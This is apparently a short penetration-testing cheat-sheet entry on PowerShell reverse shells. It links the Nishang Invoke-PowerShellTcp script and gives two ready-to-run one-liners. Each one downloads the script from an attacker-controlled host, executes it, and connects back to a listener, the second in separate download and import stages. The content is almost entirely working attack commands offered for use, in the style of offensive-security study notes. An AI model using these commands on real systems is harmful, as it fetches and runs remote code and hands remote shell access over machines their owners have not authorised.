# powershell

- Powershell reverse shell can be found at [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Connect to listener using

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://$me:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ip -Port 1234
```

Or the same but in stages

```powershell
powershell (New-Object Net.WebClient).Downloadfile('http://$ip:8888/rev.ps1')
powershell Import-Module ./rev.ps1; Invoke-PowershellTcp -Reverse -IPAddress $ip -Port 1234
```